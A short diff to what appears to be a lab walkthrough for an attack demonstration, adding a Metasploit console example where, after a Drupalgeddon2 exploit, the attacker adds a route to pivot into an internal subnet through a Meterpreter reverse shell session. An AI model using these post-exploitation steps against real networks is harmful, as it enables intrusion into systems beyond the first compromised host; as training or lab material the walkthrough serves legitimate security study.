@@ -523,6 +523,11 @@ msf5 exploit(unix/webapp/drupal_drupalgeddon2) >
     
 **Route traffic to the Internal Network through the esablished reverse shell**
 1.	 Type **route add 192.168.20.0/24 1**, where the subnet specified is the subnet of the **Internal Segment**
+
+```console
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > route add 192.168.20.0/24 1
+[*] Route added
+```
     
 6. Confirm the vulnerable server was sucessfully exploited and a **Meterpreter** reverse TCP session was established from **App1-WEB-TIER VM** back to the **Extermal VM**
 
